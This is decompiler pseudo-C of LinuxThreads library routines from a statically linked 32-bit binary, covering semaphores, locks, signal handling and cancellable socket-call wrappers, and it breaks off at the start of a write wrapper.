// 80660A4: using guessed type int pthread_atfork_prepare;
// 80660A8: using guessed type int pthread_atfork_child;
// 80660AC: using guessed type int pthread_atfork_parent;

//----- (0804BDA5) --------------------------------------------------------
signed int __usercall pthread_atfork@<eax>(off_t a1@<ebp>, int a2@<edi>, int a3, int a4, int a5)
{
  _DWORD *v5; // ebx@1
  signed int result; // eax@1

  v5 = (_DWORD *)malloc(a1, a2, 0x18u);
  result = 12;
  if ( v5 )
  {
    pthread_mutex_lock((int)&pthread_atfork_lock);
    pthread_insert_list(&pthread_atfork_prepare, a3, v5, 0);
    pthread_insert_list(&pthread_atfork_parent, a4, v5 + 2, 1);
    pthread_insert_list(&pthread_atfork_child, a5, v5 + 4, 1);
    pthread_mutex_unlock((int)&pthread_atfork_lock);
    result = 0;
  }
  return result;
}
// 80660A4: using guessed type int pthread_atfork_prepare;
// 80660A8: using guessed type int pthread_atfork_child;
// 80660AC: using guessed type int pthread_atfork_parent;

//----- (0804BE18) --------------------------------------------------------
int *__usercall enqueue@<eax>(int *result@<eax>, int a2@<edx>)
{
  int v2; // ecx@5

  while ( 1 )
  {
    v2 = *result;
    if ( !*result )
      break;
    if ( *(_DWORD *)(a2 + 24) > *(_DWORD *)(v2 + 24) )
    {
      *(_DWORD *)(a2 + 8) = v2;
      break;
    }
    result = (int *)(v2 + 8);
  }
  *result = a2;
  return result;
}

//----- (0804BE35) --------------------------------------------------------
signed int __usercall remove_from_queue@<eax>(int *a1@<eax>, int a2@<edx>)
{
  int *i; // ebx@1
  signed int result; // eax@3
  int v4; // ecx@5

  for ( i = a1; ; i = (int *)(v4 + 8) )
  {
    v4 = *i;
    if ( !*i )
      break;
    if ( v4 == a2 )
    {
      *i = *(_DWORD *)(v4 + 8);
      result = 1;
      *(_DWORD *)(v4 + 8) = 0;
      return result;
    }
  }
  return 0;
}

//----- (0804BE5E) --------------------------------------------------------
int __cdecl sem_getvalue(int a1, _DWORD *a2)
{
  *a2 = *(_DWORD *)(a1 + 8);
  return 0;
}

//----- (0804BE6E) --------------------------------------------------------
int __usercall _pthread_set_own_extricate_if@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v2; // ebx@1
  int v3; // esi@1
  int v5; // [esp+0h] [ebp-Ch]@0

  v2 = a1;
  v3 = a2;
  if ( a2 )
  {
    if ( *(_BYTE *)(a1 + 64) )
      return v5;
  }
  else
  {
    _pthread_lock(*(volatile signed __int32 **)(a1 + 28), a1);
  }
  *(_DWORD *)(v2 + 444) = v3;
  if ( !v3 )
    _pthread_unlock(*(volatile signed __int32 **)(v2 + 28));
  return v5;
}

//----- (0804BEA9) --------------------------------------------------------
signed int sem_unlink()
{
  *(_DWORD *)_errno_location() = 38;
  return -1;
}

//----- (0804BEBE) --------------------------------------------------------
signed int sem_close()
{
  *(_DWORD *)_errno_location() = 38;
  return -1;
}

//----- (0804BED3) --------------------------------------------------------
int sem_open()
{
  *(_DWORD *)_errno_location() = 38;
  return 0;
}

//----- (0804BEE7) --------------------------------------------------------
signed int __cdecl sem_destroy(int a1)
{
  signed int v1; // edx@1
  _DWORD *v2; // eax@2

  v1 = 0;
  if ( *(_DWORD *)(a1 + 12) )
  {
    v2 = _errno_location();
    v1 = -1;
    *v2 = 16;
  }
  return v1;
}

//----- (0804BF0A) --------------------------------------------------------
signed int __cdecl sem_trywait(int a1)
{
  int v1; // eax@1
  signed int v2; // esi@2

  _pthread_lock((volatile signed __int32 *)a1, 0);
  v1 = *(_DWORD *)(a1 + 8);
  if ( v1 )
  {
    v2 = 0;
    *(_DWORD *)(a1 + 8) = v1 - 1;
  }
  else
  {
    v2 = -1;
    *(_DWORD *)_errno_location() = 11;
  }
  _pthread_unlock((volatile signed __int32 *)a1);
  return v2;
}

//----- (0804BF4A) --------------------------------------------------------
signed int __cdecl sem_init(_DWORD *a1, int a2, int a3)
{
  if ( a3 < 0 )
  {
    *(_DWORD *)_errno_location() = 22;
    return -1;
  }
  if ( a2 )
  {
    *(_DWORD *)_errno_location() = 38;
    return -1;
  }
  *a1 = 0;
  a1[1] = 0;
  a1[2] = a3;
  a1[3] = 0;
  return 0;
}

//----- (0804BF9A) --------------------------------------------------------
void **thread_self_0()
{
  void **result; // eax@1
  void *retaddr; // [esp+0h] [ebp+0h]@1

  result = &_pthread_initial_thread;
  if ( (unsigned int)&retaddr < _pthread_initial_thread_bos )
  {
    if ( (unsigned int)&retaddr < _pthread_manager_thread_bos
      || (result = (void **)&_pthread_manager_thread, (unsigned int)&retaddr >= _pthread_manager_thread_tos) )
    {
      if ( _pthread_nonstandard_stacks )
        result = (void **)_pthread_find_self();
      else
        result = (void **)(((unsigned int)&retaddr | 0x1FFFFF) - 479);
    }
  }
  return result;
}
// 80614E0: using guessed type void *_pthread_initial_thread;
// 80661CC: using guessed type int _pthread_initial_thread_bos;
// 80661D0: using guessed type int _pthread_manager_thread_bos;
// 806A600: using guessed type int _pthread_nonstandard_stacks;

//----- (0804BFD9) --------------------------------------------------------
int __cdecl new_sem_extricate_func(int a1, int a2)
{
  void **v2; // ST20_4@1
  signed int v3; // esi@1

  v2 = thread_self_0();
  _pthread_lock((volatile signed __int32 *)a1, (int)v2);
  v3 = remove_from_queue((int *)(a1 + 12), a2);
  _pthread_unlock((volatile signed __int32 *)a1);
  return v3;
}

//----- (0804C015) --------------------------------------------------------
int __usercall suspend@<eax>(int a1@<eax>)
{
  return _pthread_wait_for_restart_signal(a1);
}

//----- (0804C022) --------------------------------------------------------
signed int __cdecl sem_timedwait(int a1, _DWORD *a2)
{
  void **v2; // esi@1
  int v3; // eax@1
  signed int result; // eax@2
  int v5; // ebx@7
  int v6; // [esp+14h] [ebp-18h]@6
  int (__cdecl *v7)(int, int); // [esp+18h] [ebp-14h]@6
  char v8; // [esp+1Ch] [ebp-10h]@20

  v2 = thread_self_0();
  _pthread_lock((volatile signed __int32 *)a1, (int)v2);
  v3 = *(_DWORD *)(a1 + 8);
  if ( v3 <= 0 )
  {
    if ( a2[1] <= 0x3B9AC9FFu )
    {
      v6 = a1;
      v7 = new_sem_extricate_func;
      *((_BYTE *)v2 + 442) = 0;
      _pthread_set_own_extricate_if((int)v2, (int)&v6);
      if ( !*((_BYTE *)v2 + 66) || (v5 = 1, *((_BYTE *)v2 + 64)) )
      {
        enqueue((int *)(a1 + 12), (int)v2);
        v5 = 0;
      }
      _pthread_unlock((volatile signed __int32 *)a1);
      if ( v5 )
      {
        _pthread_set_own_extricate_if((int)v2, 0);
        goto LABEL_20;
      }
      do
      {
        if ( !_pthread_timedsuspend_new(v5, (int)a2, a1, (int)v2, (int)v2, a2) )
        {
          _pthread_lock((volatile signed __int32 *)a1, (int)v2);
          v5 = remove_from_queue((int *)(a1 + 12), (int)v2);
          _pthread_unlock((volatile signed __int32 *)a1);
          if ( v5 )
          {
            _pthread_set_own_extricate_if((int)v2, 0);
            *(_DWORD *)_errno_location() = 110;
            return -1;
          }
          suspend((int)v2);
        }
      }
      while ( !*((_BYTE *)v2 + 442) && (!*((_BYTE *)v2 + 440) || *((_BYTE *)v2 + 64)) );
      _pthread_set_own_extricate_if((int)v2, 0);
      if ( *((_BYTE *)v2 + 440) && !*((_BYTE *)v2 + 64) )
      {
        *((_BYTE *)v2 + 440) = 0;
LABEL_20:
        _pthread_do_exit((off_t)a2, (void *)0xFFFFFFFF, (unsigned int)&v8);
      }
      result = 0;
    }
    else
    {
      _pthread_unlock((volatile signed __int32 *)a1);
      *(_DWORD *)_errno_location() = 22;
      result = -1;
    }
  }
  else
  {
    *(_DWORD *)(a1 + 8) = v3 - 1;
    _pthread_unlock((volatile signed __int32 *)a1);
    result = 0;
  }
  return result;
}

//----- (0804C17B) --------------------------------------------------------
int __usercall sem_wait@<eax>(off_t a1@<ebp>, int a2)
{
  int v2; // eax@1
  signed int v3; // esi@4
  int v5; // [esp+8h] [ebp-14h]@1
  int (__cdecl *v6)(int, int); // [esp+Ch] [ebp-10h]@1
  void **v7; // [esp+10h] [ebp-Ch]@1
  char v8; // [esp+14h] [ebp-8h]@14

  v7 = thread_self_0();
  v5 = a2;
  v6 = new_sem_extricate_func;
  _pthread_lock((volatile signed __int32 *)a2, (int)v7);
  v2 = *(_DWORD *)(a2 + 8);
  if ( v2 > 0 )
  {
    *(_DWORD *)(a2 + 8) = v2 - 1;
    _pthread_unlock((volatile signed __int32 *)a2);
    return 0;
  }
  *((_BYTE *)v7 + 442) = 0;
  _pthread_set_own_extricate_if((int)v7, (int)&v5);
  if ( !*((_BYTE *)v7 + 66) || (v3 = 1, *((_BYTE *)v7 + 64)) )
  {
    enqueue((int *)(a2 + 12), (int)v7);
    v3 = 0;
  }
  _pthread_unlock((volatile signed __int32 *)a2);
  if ( v3 )
  {
    _pthread_set_own_extricate_if((int)v7, 0);
    goto LABEL_14;
  }
  do
    suspend((int)v7);
  while ( !*((_BYTE *)v7 + 442) && (!*((_BYTE *)v7 + 440) || *((_BYTE *)v7 + 64)) );
  _pthread_set_own_extricate_if((int)v7, 0);
  if ( *((_BYTE *)v7 + 440) && !*((_BYTE *)v7 + 64) )
  {
    *((_BYTE *)v7 + 440) = 0;
LABEL_14:
    _pthread_do_exit(a1, (void *)0xFFFFFFFF, (unsigned int)&v8);
  }
  return 0;
}

//----- (0804C28C) --------------------------------------------------------
signed int __usercall sem_post@<eax>(unsigned __int32 ebp0@<ebp>, int a2@<edi>, int a1)
{
  void **v3; // eax@1
  int v4; // eax@3
  signed int result; // eax@4
  int v6; // ebx@8
  char addr; // [esp+20h] [ebp-9Ch]@15
  int v8; // [esp+24h] [ebp-98h]@14
  int v9; // [esp+28h] [ebp-94h]@14

  v3 = thread_self_0();
  if ( v3[21] )
  {
    if ( _pthread_manager_request >= 0 || _pthread_initialize_manager(ebp0, a2) >= 0 )
    {
      v8 = 4;
      v9 = a1;
      while ( _libc_write(_pthread_manager_request, &addr, 0x94u) == -1 && *(_DWORD *)_errno_location() == 4 )
        ;
      result = 0;
    }
    else
    {
      *(_DWORD *)_errno_location() = 11;
      result = -1;
    }
  }
  else
  {
    _pthread_lock((volatile signed __int32 *)a1, (int)v3);
    if ( *(_DWORD *)(a1 + 12) )
    {
      v6 = *(_DWORD *)(a1 + 12);
      if ( v6 )
      {
        *(_DWORD *)(a1 + 12) = *(_DWORD *)(v6 + 8);
        *(_DWORD *)(v6 + 8) = 0;
      }
      _pthread_unlock((volatile signed __int32 *)a1);
      *(_BYTE *)(v6 + 442) = 1;
      _pthread_restart_new(v6);
    }
    else
    {
      v4 = *(_DWORD *)(a1 + 8);
      if ( v4 == 0x7FFFFFFF )
      {
        *(_DWORD *)_errno_location() = 34;
        _pthread_unlock((volatile signed __int32 *)a1);
        return -1;
      }
      *(_DWORD *)(a1 + 8) = v4 + 1;
      _pthread_unlock((volatile signed __int32 *)a1);
    }
    result = 0;
  }
  return result;
}

//----- (0804C37D) --------------------------------------------------------
void **thread_self_1()
{
  void **result; // eax@1
  void *retaddr; // [esp+0h] [ebp+0h]@1

  result = &_pthread_initial_thread;
  if ( (unsigned int)&retaddr < _pthread_initial_thread_bos )
  {
    if ( (unsigned int)&retaddr < _pthread_manager_thread_bos
      || (result = (void **)&_pthread_manager_thread, (unsigned int)&retaddr >= _pthread_manager_thread_tos) )
    {
      if ( _pthread_nonstandard_stacks )
        result = (void **)_pthread_find_self();
      else
        result = (void **)(((unsigned int)&retaddr | 0x1FFFFF) - 479);
    }
  }
  return result;
}
// 80614E0: using guessed type void *_pthread_initial_thread;
// 80661CC: using guessed type int _pthread_initial_thread_bos;
// 80661D0: using guessed type int _pthread_manager_thread_bos;
// 806A600: using guessed type int _pthread_nonstandard_stacks;

//----- (0804C3BC) --------------------------------------------------------
void **__cdecl pthread_sighandler_rt(void *a1, int a2, int a3)
{
  void **result; // eax@1
  void **v4; // ebx@1
  void *v5; // esi@3
  int v6; // [esp+0h] [ebp-Ch]@4

  result = thread_self_1();
  v4 = result;
  if ( *((_BYTE *)result + 88) )
  {
    *((_BYTE *)result + 88) = 0;
    result[8] = a1;
  }
  else
  {
    v5 = result[21];
    if ( !v5 )
      result[21] = &v6;
    result = (void **)((int (__cdecl *)(void *, int, int, void **))sighandler[(signed int)a1])(a1, a2, a3, result);
    if ( !v5 )
      v4[21] = 0;
  }
  return result;
}

//----- (0804C406) --------------------------------------------------------
void **__cdecl pthread_sighandler(void *a1, char a2)
{
  void **result; // eax@1
  void **v3; // ebx@1
  void *v4; // edi@3
  int v5; // [esp-5Ch] [ebp-68h]@5
  int v6; // [esp+0h] [ebp-Ch]@4

  result = thread_self_1();
  v3 = result;
  if ( *((_BYTE *)result + 88) )
  {
    *((_BYTE *)result + 88) = 0;
    result[8] = a1;
  }
  else
  {
    v4 = result[21];
    if ( !v4 )
      result[21] = &v6;
    memcpy((char *)&v5, &a2, 0x58u);
    result = (void **)((int (__cdecl *)(void *))sighandler[(signed int)a1])(a1);
    if ( !v4 )
      v3[21] = 0;
  }
  return result;
}

//----- (0804C45E) --------------------------------------------------------
signed int __cdecl sigaction(int a1, char *a2, _DWORD *a3)
{
  int *v3; // eax@5
  signed int v4; // eax@14
  signed int v5; // edx@14
  void *v7; // [esp+10h] [ebp-9Ch]@6

  if ( a1 == _pthread_sig_restart || a1 == _pthread_sig_cancel || a1 == _pthread_sig_debug && a1 > 0 )
    return 22;
  v3 = 0;
  if ( a2 )
  {
    memcpy((char *)&v7, a2, 0x8Cu);
    if ( *(_DWORD *)a2 <= 1u || a1 <= 0 || a1 > 64 )
    {
      v3 = (int *)&v7;
    }
    else
    {
      if ( a2[132] & 4 )
        v7 = pthread_sighandler_rt;
      else
        v7 = pthread_sighandler;
      v3 = (int *)&v7;
    }
  }
  v4 = _libc_sigaction(a1, (int)v3, (int)a3);
  v5 = -1;
  if ( v4 != -1 )
  {
    if ( (unsigned int)(a1 - 1) <= 0x3F )
    {
      if ( a3 )
        *a3 = sighandler[a1];
      if ( a2 )
        sighandler[a1] = *(_DWORD *)a2;
    }
    v5 = 0;
  }
  return v5;
}

//----- (0804C53D) --------------------------------------------------------
int __usercall sigwait@<eax>(off_t a1@<ebp>, int a2, _DWORD *a3)
{
  int v3; // esi@1
  int *v4; // ebx@1
  char v6; // [esp+4h] [ebp-1B8h]@10
  int (*v7)(); // [esp+A0h] [ebp-11Ch]@7
  char v8; // [esp+A4h] [ebp-118h]@7
  int v9; // [esp+124h] [ebp-98h]@7
  char v10; // [esp+12Ch] [ebp-90h]@1
  void **v11; // [esp+1ACh] [ebp-10h]@1

  v3 = 1;
  v11 = thread_self_1();
  v4 = (int *)&v10;
  sigfillset(&v10);
  sigdelset((int)&v10, _pthread_sig_cancel);
  while ( v3 <= 65 )
  {
    if ( sigismember(a2, v3) )
    {
      if ( v3 != _pthread_sig_restart && v3 != _pthread_sig_cancel && v3 != _pthread_sig_debug )
      {
        sigdelset((int)&v10, v3);
        if ( (unsigned int)sighandler[v3] <= 1 )
        {
          v7 = pthread_null_sighandler;
          v4 = (int *)&v7;
          sigemptyset(&v8);
          v9 = 0;
          sigaction(v3, (char *)&v7, 0);
        }
      }
    }
    ++v3;
  }
  if ( !_sigsetjmp((int)v4, a1, a2, v3, (int)&v6, 1) )
  {
    v11[10] = &v6;
    if ( !*((_BYTE *)v11 + 66) || *((_BYTE *)v11 + 64) )
    {
      v11[8] = 0;
      *((_BYTE *)v11 + 88) = 1;
      sigsuspend();
    }
  }
  v11[10] = 0;
  pthread_testcancel(a1);
  *a3 = v11[8];
  return 0;
}
// 804C37C: using guessed type int pthread_null_sighandler();

//----- (0804C6AA) --------------------------------------------------------
int __cdecl pthread_kill(int a1, int sig)
{
  int *v2; // esi@1
  int v3; // eax@1
  signed int v4; // edx@3
  int v5; // ebx@4
  unsigned int v6; // eax@4

  v2 = &_pthread_handles[4 * (a1 & 0x3FF)];
  _pthread_lock((volatile signed __int32 *)v2, 0);
  v3 = v2[2];
  if ( v3 && *(_DWORD *)(v3 + 16) == a1 )
  {
    v5 = *(_DWORD *)(v3 + 20);
    _pthread_unlock((volatile signed __int32 *)v2);
    v6 = kill(v5, sig);
    v4 = 0;
    if ( v6 == -1 )
      v4 = *(_DWORD *)_errno_location();
  }
  else
  {
    _pthread_unlock((volatile signed __int32 *)v2);
    v4 = 3;
  }
  return v4;
}
// 805D4C0: using guessed type int _pthread_handles[];

//----- (0804C718) --------------------------------------------------------
int __cdecl raise(int sig)
{
  void *v1; // eax@1
  int v2; // ebx@1
  int result; // eax@1

  v1 = pthread_self();
  v2 = pthread_kill((int)v1, sig);
  result = 0;
  if ( v2 )
  {
    *(_DWORD *)_errno_location() = v2;
    result = -1;
  }
  return result;
}

//----- (0804C746) --------------------------------------------------------
int __cdecl pthread_sigmask(unsigned int a1, char *a2)
{
  char *v2; // eax@1
  signed int v3; // eax@12
  int v4; // edx@12
  char v6; // [esp+4h] [ebp-88h]@2

  v2 = a2;
  if ( a2 )
  {
    memcpy(&v6, a2, 0x80u);
    if ( a1 == 1 )
    {
      sigdelset((int)&v6, _pthread_sig_restart);
    }
    else
    {
      if ( a1 == 2 )
      {
        sigaddset((int)&v6, _pthread_sig_restart);
      }
      else if ( a1 )
      {
        goto LABEL_11;
      }
      sigdelset((int)&v6, _pthread_sig_cancel);
      if ( _pthread_sig_debug <= 0 )
      {
LABEL_11:
        v2 = &v6;
        goto LABEL_12;
      }
      sigdelset((int)&v6, _pthread_sig_debug);
    }
    v2 = &v6;
  }
LABEL_12:
  v3 = sigprocmask(a1, (int)v2);
  v4 = 0;
  if ( v3 == -1 )
    v4 = *(_DWORD *)_errno_location();
  return v4;
}

//----- (0804C7F8) --------------------------------------------------------
int __usercall wait_node_dequeue@<eax>(volatile signed __int32 *a1@<eax>, volatile signed __int32 *a2@<edx>, signed __int32 *a3@<ecx>)
{
  int v4; // [esp+0h] [ebp-8h]@0

  if ( a2 == a1 )
  {
    if ( a3 == (signed __int32 *)_InterlockedCompareExchange(a2, *a3, (signed __int32)a3) )
      return v4;
    while ( a3 != *(signed __int32 **)a2 )
      a2 = (volatile signed __int32 *)*a2;
  }
  *a2 = *a3;
  return v4;
}

//----- (0804C820) --------------------------------------------------------
signed __int32 __usercall _pthread_acquire@<eax>(volatile signed __int32 *a1@<eax>, off_t a2@<ebp>)
{
  volatile signed __int32 *v2; // ebx@1
  signed int v3; // esi@1
  signed __int32 result; // eax@5
  int v5; // [esp+Ch] [ebp-10h]@4
  int v6; // [esp+10h] [ebp-Ch]@4

  v2 = a1;
  v3 = 0;
  while ( 1 )
  {
    result = _InterlockedExchange(v2, 1);
    if ( !result )
      break;
    if ( v3 > 49 )
    {
      v5 = 0;
      v6 = 2000001;
      v3 = 0;
      nanosleep(a2, (int)&v5, 0);
    }
    else
    {
      sched_yield();
      ++v3;
    }
  }
  return result;
}

//----- (0804C86C) --------------------------------------------------------
int __usercall wait_node_free@<eax>(_DWORD *a1@<eax>, off_t a2@<ebp>)
{
  _DWORD *v2; // ebx@1
  int result; // eax@1

  v2 = a1;
  _pthread_acquire((volatile signed __int32 *)&wait_node_free_list_spinlock, a2);
  result = wait_node_free_list;
  *v2 = wait_node_free_list;
  wait_node_free_list = (int)v2;
  wait_node_free_list_spinlock = 0;
  return result;
}
// 80661C4: using guessed type int wait_node_free_list;
// 80661C8: using guessed type int wait_node_free_list_spinlock;

//----- (0804C897) --------------------------------------------------------
unsigned int __usercall restart_0@<eax>(int a1@<eax>)
{
  return _pthread_restart_new(a1);
}

//----- (0804C8A4) --------------------------------------------------------
unsigned int __cdecl _pthread_alt_unlock(volatile signed __int32 *a1)
{
  signed __int32 v1; // edx@1
  unsigned int result; // eax@2
  signed __int32 *v3; // ebx@4
  volatile signed __int32 *v4; // ebp@4
  volatile signed __int32 v5; // edi@4
  volatile signed __int32 *v6; // [esp+0h] [ebp-1Ch]@4
  signed int v7; // [esp+4h] [ebp-18h]@4

  do
  {
    while ( 1 )
    {
      v1 = *a1;
      if ( *a1 > 1u )
        break;
      result = _InterlockedCompareExchange(a1, 0, v1);
      if ( v1 == result )
        return result;
    }
    v3 = (signed __int32 *)*a1;
    v4 = a1;
    v5 = *a1;
    v6 = a1;
    v7 = 2147483648;
    while ( v3 != (signed __int32 *)1 )
    {
      if ( v3[2] )
      {
        wait_node_dequeue(a1, v4, v3);
        wait_node_free(v3, (off_t)v4);
        v3 = (signed __int32 *)*v4;
      }
      else
      {
        if ( *(_DWORD *)(v3[1] + 24) >= v7 )
        {
          v5 = (volatile signed __int32)v3;
          v6 = v4;
          v7 = *(_DWORD *)(v3[1] + 24);
        }
        v4 = v3;
        v3 = (signed __int32 *)*v3;
      }
    }
  }
  while ( v7 == 0x80000000 || _InterlockedExchange((volatile signed __int32 *)(v5 + 8), 1) );
  wait_node_dequeue(a1, v6, (signed __int32 *)v5);
  return restart_0(*(_DWORD *)(v5 + 4));
}

//----- (0804C952) --------------------------------------------------------
void **thread_self_2()
{
  void **result; // eax@1
  void *retaddr; // [esp+0h] [ebp+0h]@1

  result = &_pthread_initial_thread;
  if ( (unsigned int)&retaddr < _pthread_initial_thread_bos )
  {
    if ( (unsigned int)&retaddr < _pthread_manager_thread_bos
      || (result = (void **)&_pthread_manager_thread, (unsigned int)&retaddr >= _pthread_manager_thread_tos) )
    {
      if ( _pthread_nonstandard_stacks )
        result = (void **)_pthread_find_self();
      else
        result = (void **)(((unsigned int)&retaddr | 0x1FFFFF) - 479);
    }
  }
  return result;
}
// 80614E0: using guessed type void *_pthread_initial_thread;
// 80661CC: using guessed type int _pthread_initial_thread_bos;
// 80661D0: using guessed type int _pthread_manager_thread_bos;
// 806A600: using guessed type int _pthread_nonstandard_stacks;

//----- (0804C991) --------------------------------------------------------
int __usercall suspend_0@<eax>(int a1@<eax>)
{
  return _pthread_wait_for_restart_signal(a1);
}

//----- (0804C99E) --------------------------------------------------------
int __cdecl _pthread_alt_lock(volatile signed __int32 *a1, void **a2)
{
  void **v2; // edx@1
  signed __int32 v3; // ebx@2
  int *v4; // ecx@2
  int result; // eax@6
  signed __int32 v6; // [esp+8h] [ebp-14h]@5
  void **v7; // [esp+Ch] [ebp-10h]@5
  int v8; // [esp+10h] [ebp-Ch]@6

  v2 = a2;
  do
  {
    v3 = *a1;
    v4 = (int *)1;
    if ( *a1 )
    {
      if ( !v2 )
        v2 = thread_self_2();
      v7 = v2;
      v4 = (int *)&v6;
    }
    v8 = 0;
    v6 = v3;
    result = _InterlockedCompareExchange(a1, (signed __int32)v4, v3);
  }
  while ( v3 != result );
  if ( v3 )
    result = suspend_0((int)v2);
  return result;
}

//----- (0804C9F3) --------------------------------------------------------
unsigned int __usercall _pthread_lock@<eax>(volatile signed __int32 *a1@<eax>, int a2@<edx>)
{
  volatile signed __int32 *v2; // ebx@1
  int v3; // edi@1
  unsigned int result; // eax@2
  int v5; // ebp@3
  signed __int32 v6; // esi@4
  signed int v7; // edx@5
  int v8; // ecx@5

  v2 = a1;
  v3 = a2;
  if ( *a1 || (result = _InterlockedCompareExchange(a1, 1, 0)) != 0 )
  {
    v5 = 0;
    while ( 1 )
    {
      do
      {
        v6 = *v2;
        if ( *v2 & 1 )
        {
          if ( !v3 )
            v3 = (int)thread_self_2();
          v7 = 0;
          v8 = v3 | 1;
        }
        else
        {
          v7 = 1;
          v8 = v6 | 1;
        }
        if ( v3 )
          *(_DWORD *)(v3 + 12) = v6;
        result = _InterlockedCompareExchange(v2, v8, v6);
      }
      while ( v6 != result );
      if ( v7 )
        break;
      while ( 1 )
      {
        suspend_0(v3);
        if ( !*(_DWORD *)(v3 + 12) )
          break;
        ++v5;
      }
    }
    while ( --v5 != -1 )
      result = restart_0(v3);
  }
  return result;
}

//----- (0804CA7E) --------------------------------------------------------
int __cdecl _pthread_unlock(volatile signed __int32 *a1)
{
  signed __int32 v1; // edx@3
  int v2; // edi@4
  unsigned int v3; // eax@4
  int v4; // ebp@4
  volatile signed __int32 *v5; // esi@4
  volatile signed __int32 v6; // ett@13
  int v8; // [esp+0h] [ebp-1Ch]@4

  while ( 1 )
  {
    while ( 1 )
    {
      v1 = *a1;
      if ( *a1 != 1 )
        break;
      if ( 1 == _InterlockedCompareExchange(a1, 0, 1) )
        return 0;
    }
    v2 = v1 & 0xFFFFFFFE;
    v3 = v1 & 0xFFFFFFFE;
    v4 = (int)a1;
    v5 = a1;
    v8 = 0;
    while ( v3 )
    {
      if ( *(_DWORD *)(v3 + 24) >= v8 )
      {
        v5 = (volatile signed __int32 *)v4;
        v8 = *(_DWORD *)(v3 + 24);
      }
      v4 = v3 + 12;
      v3 = *(_DWORD *)(v3 + 12) & 0xFFFFFFFE;
    }
    if ( v5 != a1 )
      break;
    if ( v1 == _InterlockedCompareExchange(a1, *(_DWORD *)(v2 + 12) & 0xFFFFFFFE, v1) )
      goto LABEL_14;
  }
  v2 = *v5 & 0xFFFFFFFE;
  *v5 = *(_DWORD *)(v2 + 12);
  do
    v6 = *a1;
  while ( v6 != _InterlockedCompareExchange(a1, *a1 & 0xFFFFFFFE, *a1) );
LABEL_14:
  *(_DWORD *)(v2 + 12) = 0;
  restart_0(v2);
  return 0;
}

//----- (0804CB1C) --------------------------------------------------------
signed int __cdecl _pthread_alt_timedlock(volatile signed __int32 *a1, void **a2, _DWORD *a3)
{
  int v3; // esi@1
  void **v4; // ebp@1
  int v5; // edx@5
  signed __int32 v6; // ebx@6
  signed __int32 v7; // edx@6

  v3 = 0;
  v4 = a2;
  _pthread_acquire((volatile signed __int32 *)&wait_node_free_list_spinlock, (off_t)a2);
  if ( wait_node_free_list )
  {
    v3 = wait_node_free_list;
    wait_node_free_list = *(_DWORD *)wait_node_free_list;
  }
  wait_node_free_list_spinlock = 0;
  if ( v3 || (v3 = malloc((off_t)a2, (int)a1, 0xCu)) != 0 )
  {
    do
    {
      v6 = *a1;
      v7 = 1;
      if ( *a1 )
      {
        if ( !v4 )
          v4 = thread_self_2();
        *(_DWORD *)(v3 + 4) = v4;
        v7 = v3;
      }
      *(_DWORD *)(v3 + 8) = 0;
      *(_DWORD *)v3 = v6;
    }
    while ( v6 != _InterlockedCompareExchange(a1, v7, v6) );
    if ( v6 && !_pthread_timedsuspend_new(v6, (int)v4, (int)a1, v3, (int)v4, a3) )
    {
      v5 = 0;
      if ( !_InterlockedExchange((volatile signed __int32 *)(v3 + 8), 1) )
        return v5;
      suspend_0((int)v4);
    }
    wait_node_free((_DWORD *)v3, (off_t)v4);
    return 1;
  }
  _pthread_alt_lock(a1, a2);
  return 1;
}
// 80661C4: using guessed type int wait_node_free_list;
// 80661C8: using guessed type int wait_node_free_list_spinlock;

//----- (0804CBF0) --------------------------------------------------------
signed int __usercall sendto@<eax>(off_t a1@<ebp>, int a2, int a3, int a4, int a5, int a6, int a7)
{
  signed int v7; // ebx@1
  unsigned int v9; // [esp+1Ch] [ebp-8h]@1

  pthread_setcanceltype(a1, 1u, &v9);
  v7 = _libc_sendto(a2, a3, a4, a5, a6, a7);
  pthread_setcanceltype(a1, v9, 0);
  return v7;
}

//----- (0804CC36) --------------------------------------------------------
signed int __usercall sendmsg@<eax>(off_t a1@<ebp>, int a2, int a3, int a4)
{
  signed int v4; // ebx@1
  unsigned int v6; // [esp+1Ch] [ebp-8h]@1

  pthread_setcanceltype(a1, 1u, &v6);
  v4 = _libc_sendmsg(a2, a3, a4);
  pthread_setcanceltype(a1, v6, 0);
  return v4;
}

//----- (0804CC70) --------------------------------------------------------
signed int __usercall send@<eax>(off_t a1@<ebp>, int a2, int a3, int a4, int a5)
{
  signed int v5; // ebx@1
  unsigned int v7; // [esp+1Ch] [ebp-8h]@1

  pthread_setcanceltype(a1, 1u, &v7);
  v5 = _libc_send(a2, a3, a4, a5);
  pthread_setcanceltype(a1, v7, 0);
  return v5;
}

//----- (0804CCAC) --------------------------------------------------------
signed int __usercall recvmsg@<eax>(off_t a1@<ebp>, int a2, int a3, int a4)
{
  signed int v4; // ebx@1
  unsigned int v6; // [esp+1Ch] [ebp-8h]@1

  pthread_setcanceltype(a1, 1u, &v6);
  v4 = _libc_recvmsg(a2, a3, a4);
  pthread_setcanceltype(a1, v6, 0);
  return v4;
}

//----- (0804CCE6) --------------------------------------------------------
signed int __usercall recvfrom@<eax>(off_t a1@<ebp>, int a2, int a3, int a4, int a5, int a6, int a7)
{
  signed int v7; // ebx@1
  unsigned int v9; // [esp+1Ch] [ebp-8h]@1

  pthread_setcanceltype(a1, 1u, &v9);
  v7 = _libc_recvfrom(a2, a3, a4, a5, a6, a7);
  pthread_setcanceltype(a1, v9, 0);
  return v7;
}

//----- (0804CD2C) --------------------------------------------------------
signed int __usercall recv@<eax>(off_t a1@<ebp>, int a2, int a3, int a4, int a5)
{
  signed int v5; // ebx@1
  unsigned int v7; // [esp+1Ch] [ebp-8h]@1

  pthread_setcanceltype(a1, 1u, &v7);
  v5 = _libc_recv(a2, a3, a4, a5);
  pthread_setcanceltype(a1, v7, 0);
  return v5;
}

//----- (0804CD68) --------------------------------------------------------
signed int __usercall connect@<eax>(off_t a1@<ebp>, int a2, int a3, int a4)
{
  signed int v4; // ebx@1
  unsigned int v6; // [esp+1Ch] [ebp-8h]@1

  pthread_setcanceltype(a1, 1u, &v6);
  v4 = _libc_connect(a2, a3, a4);
  pthread_setcanceltype(a1, v6, 0);
  return v4;
}

//----- (0804CDA2) --------------------------------------------------------
signed int __usercall accept@<eax>(off_t a1@<ebp>, int a2, int a3, int a4)
{
  signed int v4; // ebx@1
  unsigned int v6; // [esp+1Ch] [ebp-8h]@1

  pthread_setcanceltype(a1, 1u, &v6);
  v4 = _libc_accept(a2, a3, a4);
  pthread_setcanceltype(a1, v6, 0);
  return v4;
}

//----- (0804CDDC) --------------------------------------------------------
unsigned int __usercall write@<eax>(off_t a1@<ebp>, int fd, void *addr, size_t len)
{
